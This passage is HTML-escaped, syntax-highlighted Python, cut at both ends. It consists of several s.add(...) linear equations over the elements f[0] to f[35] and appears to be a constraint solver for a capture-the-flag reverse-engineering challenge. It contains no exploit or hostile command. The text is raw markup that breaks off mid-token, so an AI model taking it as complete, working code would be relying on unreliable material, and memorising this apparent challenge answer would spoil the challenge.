style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69431&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54106&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8292&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span 